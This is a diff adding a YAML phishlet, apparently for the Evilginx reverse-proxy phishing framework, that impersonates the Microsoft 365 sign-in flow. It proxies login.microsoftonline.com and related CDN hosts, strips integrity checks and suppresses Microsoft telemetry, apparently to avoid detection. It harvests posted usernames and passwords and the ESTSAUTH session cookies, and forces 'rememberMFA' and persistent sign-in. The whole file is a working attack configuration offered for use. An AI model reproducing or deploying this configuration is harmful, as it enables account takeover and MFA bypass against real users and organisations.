@@ -1,0 +1,54 @@
+name: 'Microsoft 365 Enterprise'
+author: '@slayer0x'
+min_ver: '3.0.0'
+redirect_url: 'https://www.google.com/'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false}
+  - {phish_sub: 'cdn-1', orig_sub: 'aadcdn', domain: 'msftauth.net', session: true, is_landing: false}
+  - {phish_sub: 'cdn-2', orig_sub: 'aadcdn', domain: 'msauth.net', session: true, is_landing: false}
+  - {phish_sub: 'cdn-3', orig_sub: 'logincdn', domain: 'msauth.net', session: true, is_landing: false}
+  - {phish_sub: 'sso', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
+  - {phish_sub: 'm365', orig_sub: 'm365', domain: 'cloud.microsoft', session: true, is_landing: false}
+  - {phish_sub: 'events', orig_sub: 'browser.events.data', domain: 'microsoft.com', session: true, is_landing: false}
+sub_filters:
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '"https:\/\/[^\.]+\.events\.data\.microsoft\.com[^"]*"', replace: '""', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'integrity="[^"]*"', replace: '', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'integrity=''[^'']*''', replace: '', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'aadcdn.msftauth.net', orig_sub: 'aadcdn', domain: 'msftauth.net', search: '"https:\/\/[^\.]+\.events\.data\.microsoft\.com[^"]*"', replace: '""', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'mad-aadcdn.msftauth.net', orig_sub: 'aadcdn', domain: 'msftauth.net', search: 'f\.send\(e\.data\)', replace: '""', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'aadcdn.msauth.net', orig_sub: 'aadcdn', domain: 'msauth.net', search: 'f\.send\(e\.data\)', replace: '""', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'aadcdn.msftauth.net', orig_sub: 'aadcdn', domain: 'msftauth.net', search: 'try{g\.sendPOST\(n,i,a\),e\.sendListener&&e\.sendListener\(A,n,a,t\.isBeacon\)}', replace: 'try{return;}', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'aadcdn.msauth.net', orig_sub: 'aadcdn', domain: 'msauth', search: 'try{g\.sendPOST\(n,i,a\),e\.sendListener&&e\.sendListener\(A,n,a,t\.isBeacon\)}', replace: 'try{return;}', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+intercept:
+  - {domain: 'browser.events.data.microsoft.com', path: '.*', http_status: 403, mime: "application/json"}
+  - {domain: 'login.microsoftonline.com', path: '/common/handlers/watson', http_status: 200, mime: "application/json"}
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
+    type: 'cookie'
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+force_post:
+  - path: '/kmsi'
+    search:
+      - {key: 'LoginOptions', search: '(.*)'}
+    force:
+      - {key: 'LoginOptions', value: '1'}
+    type: 'post'
+  - path: '/common/SAS'
+    search:
+      - {key: 'rememberMFA', search: '(.*)'}
+    force:
+      - {key: 'rememberMFA', value: 'true'}
+    type: 'post'
